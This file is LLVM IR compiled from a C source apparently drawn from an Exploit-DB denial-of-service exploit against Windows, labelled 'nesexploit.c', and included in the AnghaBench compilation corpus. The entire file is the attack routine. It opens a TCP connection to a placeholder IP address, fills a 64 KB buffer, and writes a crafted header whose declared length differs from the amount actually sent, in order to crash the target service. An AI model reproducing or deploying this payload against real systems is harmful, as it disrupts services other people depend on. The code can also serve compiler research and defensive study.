; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_19416.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_19416.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_4__ = type { i64*, %struct.TYPE_3__, i32, i32 }
%struct.TYPE_3__ = type { i32 }

@__const.main.ipaddr = private unnamed_addr constant [25 x i8] c"xxx.xxx.xxx.xxx\00\00\00\00\00\00\00\00\00\00", align 16
@xxxxx = common dso_local global i16 0, align 2
@.str = private unnamed_addr constant [63 x i8] c"\0Anesexploit.c - developed by Arne Vidstrom, winnt@bahnhof.se\0A\0A\00", align 1
@PF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@AF_INET = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [33 x i8] c"Ehmn, where's that server? ;o)\0A\0A\00", align 1
@SPECIFIED_SIZE = common dso_local global i32 0, align 4
@PADDING = common dso_local global i8 0, align 1
@ACTUAL_SIZE = common dso_local global i32 0, align 4
@SOCKET_ERROR = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [8 x i8] c"Done!\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @main() #0 {
  %1 = alloca [25 x i8], align 16
  %2 = alloca i16, align 2
  %3 = alloca i32, align 4
  %4 = alloca [65536 x i8], align 16
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca %struct.TYPE_4__, align 8
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = bitcast [25 x i8]* %1 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %12, i8* align 16 getelementptr inbounds ([25 x i8], [25 x i8]* @__const.main.ipaddr, i32 0, i32 0), i64 25, i1 false)
  %13 = load i16, i16* @xxxxx, align 2
  store i16 %13, i16* %2, align 2
  %14 = call i32 @printf(i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str, i64 0, i64 0))
  %15 = call i32 @WSAStartup(i32 257, i32* %6)
  store i32 %15, i32* %5, align 4
  %16 = load i32, i32* @PF_INET, align 4
  %17 = load i32, i32* @SOCK_STREAM, align 4
  %18 = load i32, i32* @IPPROTO_TCP, align 4
  %19 = call i32 @socket(i32 %16, i32 %17, i32 %18)
  store i32 %19, i32* %3, align 4
  %20 = load i32, i32* @AF_INET, align 4
  %21 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %7, i32 0, i32 3
  store i32 %20, i32* %21, align 8
  %22 = load i16, i16* %2, align 2
  %23 = call i32 @htons(i16 zeroext %22)
  %24 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %7, i32 0, i32 2
  store i32 %23, i32* %24, align 4
  %25 = getelementptr inbounds [25 x i8], [25 x i8]* %1, i64 0, i64 0
  %26 = call i32 @inet_addr(i8* %25)
  %27 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %7, i32 0, i32 1
  %28 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %27, i32 0, i32 0
  store i32 %26, i32* %28, align 8
  store i8 0, i8* %9, align 1
  br label %29

29:                                               ; preds = %39, %0
  %30 = load i8, i8* %9, align 1
  %31 = zext i8 %30 to i32
  %32 = icmp slt i32 %31, 8
  br i1 %32, label %33, label %42

33:                                               ; preds = %29
  %34 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %7, i32 0, i32 0
  %35 = load i64*, i64** %34, align 8
  %36 = load i8, i8* %9, align 1
  %37 = zext i8 %36 to i64
  %38 = getelementptr inbounds i64, i64* %35, i64 %37
  store i64 0, i64* %38, align 8
  br label %39

39:                                               ; preds = %33
  %40 = load i8, i8* %9, align 1
  %41 = add i8 %40, 1
  store i8 %41, i8* %9, align 1
  br label %29

42:                                               ; preds = %29
  %43 = load i32, i32* %3, align 4
  %44 = bitcast %struct.TYPE_4__* %7 to i32*
  %45 = call i32 @connect(i32 %43, i32* %44, i32 24)
  store i32 %45, i32* %8, align 4
  %46 = load i32, i32* %8, align 4
  %47 = icmp ne i32 %46, 0
  br i1 %47, label %48, label %50

48:                                               ; preds = %42
  %49 = call i32 @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.1, i64 0, i64 0))
  br label %50

50:                                               ; preds = %48, %42
  store i32 0, i32* %10, align 4
  br label %51

51:                                               ; preds = %58, %50
  %52 = load i32, i32* %10, align 4
  %53 = icmp ult i32 %52, 65536
  br i1 %53, label %54, label %61

54:                                               ; preds = %51
  %55 = load i32, i32* %10, align 4
  %56 = zext i32 %55 to i64
  %57 = getelementptr inbounds [65536 x i8], [65536 x i8]* %4, i64 0, i64 %56
  store i8 46, i8* %57, align 1
  br label %58

58:                                               ; preds = %54
  %59 = load i32, i32* %10, align 4
  %60 = add i32 %59, 1
  store i32 %60, i32* %10, align 4
  br label %51

61:                                               ; preds = %51
  %62 = load i32, i32* @SPECIFIED_SIZE, align 4
  %63 = and i32 %62, 65280
  %64 = ashr i32 %63, 8
  %65 = trunc i32 %64 to i8
  %66 = getelementptr inbounds [65536 x i8], [65536 x i8]* %4, i64 0, i64 0
  store i8 %65, i8* %66, align 16
  %67 = load i32, i32* @SPECIFIED_SIZE, align 4
  %68 = and i32 %67, 255
  %69 = trunc i32 %68 to i8
  %70 = getelementptr inbounds [65536 x i8], [65536 x i8]* %4, i64 0, i64 1
  store i8 %69, i8* %70, align 1
  %71 = load i8, i8* @PADDING, align 1
  %72 = getelementptr inbounds [65536 x i8], [65536 x i8]* %4, i64 0, i64 2
  store i8 %71, i8* %72, align 2
  %73 = getelementptr inbounds [65536 x i8], [65536 x i8]* %4, i64 0, i64 3
  store i8 1, i8* %73, align 1
  %74 = getelementptr inbounds [65536 x i8], [65536 x i8]* %4, i64 0, i64 4
  store i8 3, i8* %74, align 4
  %75 = getelementptr inbounds [65536 x i8], [65536 x i8]* %4, i64 0, i64 5
  store i8 0, i8* %75, align 1
  %76 = getelementptr inbounds [65536 x i8], [65536 x i8]* %4, i64 0, i64 6
  store i8 0, i8* %76, align 2
  %77 = getelementptr inbounds [65536 x i8], [65536 x i8]* %4, i64 0, i64 7
  store i8 12, i8* %77, align 1
  %78 = getelementptr inbounds [65536 x i8], [65536 x i8]* %4, i64 0, i64 8
  store i8 0, i8* %78, align 8
  %79 = getelementptr inbounds [65536 x i8], [65536 x i8]* %4, i64 0, i64 9
  store i8 0, i8* %79, align 1
  %80 = getelementptr inbounds [65536 x i8], [65536 x i8]* %4, i64 0, i64 10
  store i8 0, i8* %80, align 2
  %81 = getelementptr inbounds [65536 x i8], [65536 x i8]* %4, i64 0, i64 11
  store i8 16, i8* %81, align 1
  %82 = getelementptr inbounds [65536 x i8], [65536 x i8]* %4, i64 0, i64 12
  store i8 2, i8* %82, align 4
  %83 = getelementptr inbounds [65536 x i8], [65536 x i8]* %4, i64 0, i64 13
  store i8 0, i8* %83, align 1
  %84 = getelementptr inbounds [65536 x i8], [65536 x i8]* %4, i64 0, i64 14
  store i8 -128, i8* %84, align 2
  %85 = getelementptr inbounds [65536 x i8], [65536 x i8]* %4, i64 0, i64 15
  store i8 4, i8* %85, align 1
  %86 = getelementptr inbounds [65536 x i8], [65536 x i8]* %4, i64 0, i64 16
  store i8 0, i8* %86, align 16
  %87 = getelementptr inbounds [65536 x i8], [65536 x i8]* %4, i64 0, i64 17
  store i8 -128, i8* %87, align 1
  %88 = getelementptr inbounds [65536 x i8], [65536 x i8]* %4, i64 0, i64 18
  store i8 0, i8* %88, align 2
  %89 = getelementptr inbounds [65536 x i8], [65536 x i8]* %4, i64 0, i64 19
  store i8 0, i8* %89, align 1
  %90 = getelementptr inbounds [65536 x i8], [65536 x i8]* %4, i64 0, i64 20
  store i8 3, i8* %90, align 4
  %91 = getelementptr inbounds [65536 x i8], [65536 x i8]* %4, i64 0, i64 21
  store i8 0, i8* %91, align 1
  %92 = getelementptr inbounds [65536 x i8], [65536 x i8]* %4, i64 0, i64 22
  store i8 0, i8* %92, align 2
  %93 = getelementptr inbounds [65536 x i8], [65536 x i8]* %4, i64 0, i64 23
  store i8 6, i8* %93, align 1
  store i32 0, i32* %11, align 4
  %94 = load i32, i32* %3, align 4
  %95 = getelementptr inbounds [65536 x i8], [65536 x i8]* %4, i64 0, i64 0
  %96 = load i32, i32* @ACTUAL_SIZE, align 4
  %97 = load i32, i32* %11, align 4
  %98 = call i32 @send(i32 %94, i8* %95, i32 %96, i32 %97)
  store i32 %98, i32* %8, align 4
  %99 = load i32, i32* %8, align 4
  %100 = load i32, i32* @SOCKET_ERROR, align 4
  %101 = icmp ne i32 %99, %100
  br i1 %101, label %102, label %104

102:                                              ; preds = %61
  %103 = call i32 @printf(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.2, i64 0, i64 0))
  br label %104

104:                                              ; preds = %102, %61
  %105 = load i32, i32* %3, align 4
  %106 = call i32 @closesocket(i32 %105)
  %107 = call i32 (...) @WSACleanup()
  ret void
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @printf(i8*) #2

declare dso_local i32 @WSAStartup(i32, i32*) #2

declare dso_local i32 @socket(i32, i32, i32) #2

declare dso_local i32 @htons(i16 zeroext) #2

declare dso_local i32 @inet_addr(i8*) #2

declare dso_local i32 @connect(i32, i32*, i32) #2

declare dso_local i32 @send(i32, i8*, i32, i32) #2

declare dso_local i32 @closesocket(i32) #2

declare dso_local i32 @WSACleanup(...) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
